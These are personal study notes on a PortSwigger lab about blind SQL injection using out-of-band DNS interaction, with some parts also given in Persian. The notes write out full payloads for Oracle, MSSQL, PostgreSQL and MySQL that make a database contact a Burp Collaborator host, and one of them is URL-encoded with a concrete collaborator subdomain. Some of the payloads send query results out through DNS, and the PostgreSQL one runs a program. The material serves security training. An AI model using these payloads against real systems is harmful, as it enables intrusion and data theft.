
Source: https://portswigger.net/web-security/sql-injection/blind

Exploiting blind SQL injection using out-of-band (OAST) techniques:

the application's response doesn't depend on whether the query returns any data, 
or on whether a database error occurs, 
or on the time taken to execute the query. 
it is often possible to exploit the blind SQL injection vulnerability 
by triggering out-of-band network interactions to a system that you control.

A variety of network protocols can be used for this purpose, 
but typically the most effective is DNS (domain name service). 
This is because very many production networks allow free egress of DNS queries, 
because they are essential for the normal operation of production systems. 

Burp Collaborator:
    The easiest and most reliable way to use out-of-band techniques is using Burp Collaborator. 
    https://portswigger.net/burp/documentation/collaborator


Lab: Blind SQL injection with out-of-band interaction
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

Target: Exploit SQLi and cause a DNS lookup

Step 1:
    configure to Burp

Step 2:
    Toolbar > Burp > Burp Collaborator client

Step 3:
    Copy to clipboard
    xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.burpcollaborator.net

Step 4:
    Go here SQL injection cheat sheet:
        https://portswigger.net/web-security/sql-injection/cheat-sheet

Step 5:
    Read more DNS lookup:
        You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred. 
        شما می توانید باعث شوید که پایگاه داده یک جستجوی DNS به یک دامنه خارجی انجام دهد. برای انجام این کار، باید از Burp Collaborator برای ایجاد یک زیر دامنه منحصر به فرد Burp Collaborator که در حمله خود استفاده خواهید کرد، استفاده کنید و سپس از سرور Collaborator نظرسنجی کنید تا تأیید کنید که جستجوی DNS رخ داده است.

        Oracle 	
            The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
            SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
            The following technique works on fully patched Oracle installations, but requires elevated privileges:
            SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')

        Microsoft 	
            exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'

        PostgreSQL
            copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'

        MySQL
            The following techniques work on Windows only:
            LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
            SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

    Oracle 1:
        SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
        SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://"> %remote;]>'),'/l') FROM dual

        '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//4ini5geizl030fmlqy9w9ixjtaz4nt.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
                                                                                                                                                 4ini5geizl030fmlqy9w9ixjtaz4nt.burpcollaborator.net
    Or
    Oracle 2:
        SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') 

    Microsoft:
        declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"') 

    PostgreSQL:
        create OR replace function f() returns void as $$
        declare c text;
        declare p text;
        begin
        SELECT into p (SELECT YOUR-QUERY-HERE);
        c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
        execute c;
        END;
        $$ language plpgsql security definer;
        SELECT f(); 

    MySQL:
         SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' 
















Lab: Blind SQL injection with out-of-band data exfiltration
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration









Read more DNS lookup with data exfiltration:
    DNS lookup with data exfiltration جستجوی DNS با استخراج داده ها
        You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data. 
        شما می توانید باعث شوید پایگاه داده یک جستجوی DNS به یک دامنه خارجی حاوی نتایج یک پرس و جو تزریق شده انجام دهد. برای انجام این کار، باید از Burp Collaborator برای ایجاد یک زیر دامنه منحصر به فرد Burp Collaborator که در حمله خود استفاده می کنید، استفاده کنید و سپس از سرور Collaborator نظرسنجی کنید تا جزئیات هر گونه تعامل DNS، از جمله داده های استخراج شده را بازیابی کنید.

    Oracle
        SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

    Microsoft
        declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')

    PostgreSQL
        create OR replace function f() returns void as $$
        declare c text;
        declare p text;
        begin
        SELECT into p (SELECT YOUR-QUERY-HERE);
        c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
        execute c;
        END;
        $$ language plpgsql security definer;
        SELECT f();

    MySQL
        The following technique works on Windows only:
        SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'































































